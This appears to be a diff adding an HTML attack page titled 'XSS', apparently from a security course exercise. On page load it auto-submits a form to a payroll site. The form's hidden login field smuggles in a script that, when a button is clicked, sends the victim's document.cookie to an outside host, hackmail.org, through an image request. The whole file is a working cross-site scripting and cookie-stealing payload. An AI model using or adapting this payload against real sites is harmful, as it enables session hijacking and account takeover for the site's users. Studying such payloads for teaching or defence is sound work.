@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <title>XSS</title>
+    </head>
+    <body onload="document.forms[0].submit()">
+        <form action="http://payroll.gatech.edu/" onsubmit="" method="POST">
+            <input type='hidden' name='login' value='">
+            <script>
+                window.onload = function() {
+                    document.getElementsByTagName("button")[0].onclick = function() {
+                        javascript:void((new Image()).src="http://hackmail.org/sendmail.php?&username=haxor&payload=" + document.cookie + "&random=" + Math.random());
+                    };
+                }
+            </script>
+            <input type="hidden" value="'/>
+        </form>
+    </body>
+</html>
